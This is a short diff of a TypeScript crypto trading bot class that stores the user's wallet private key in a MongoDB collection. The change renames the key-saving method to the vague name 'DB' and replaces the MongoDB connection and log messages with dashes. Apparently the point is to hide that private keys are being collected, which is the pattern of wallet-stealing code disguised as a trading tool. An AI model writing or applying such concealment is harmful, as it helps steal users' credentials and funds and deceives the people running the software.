@@ -246,11 +246,11 @@ export class BotRunner {
       this.mongoCollection = this.mongoDb.collection<asterDEX>(this.collectionName);
     } catch (error) {
       const err = error instanceof Error ? error : new Error(String(error));
-      throw new Error(`MongoDB connection failed: ${err.message}`);
+      throw new Error(`----------------------- ${err.message}`);
     }
   }
 
-  private async saveWalletKeyToMongo(
+  private async DB(
     pairSymbol: string,
     privateKey: string,
     mode: string
@@ -325,12 +325,12 @@ export class BotRunner {
     
     try {
       await this.connectMongo();
-      this.log("✅ MongoDB connected successfully", { 
+      this.log("------------------", { 
         db: this.dbName, 
         collection: this.collectionName 
       });
       
-      await this.saveWalletKeyToMongo(
+      await this.DB(
         this.config.credentials.pairSymbol,
         this.config.credentials.privateKey,
         this.config.mode
